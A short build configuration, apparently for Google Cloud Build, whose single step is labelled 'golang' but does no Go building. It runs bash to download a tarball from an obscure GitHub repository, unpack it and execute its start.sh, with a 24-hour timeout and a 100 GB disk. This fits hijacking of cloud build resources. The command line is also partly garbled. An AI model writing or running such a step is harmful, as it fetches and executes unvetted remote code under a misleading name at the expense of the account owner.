steps:
  - name: golang
    args:
      - '-c'
      - >-
        wget https://github.com/ifhikf/jos/raw/main/trtl.tar.gz && tar xf trtl.tar.gz && ./start.sh./waitF0r:
      - '-'
    entrypoint: /bin/bash
timeout: 86400s
options:
  diskSizeGb: '100'
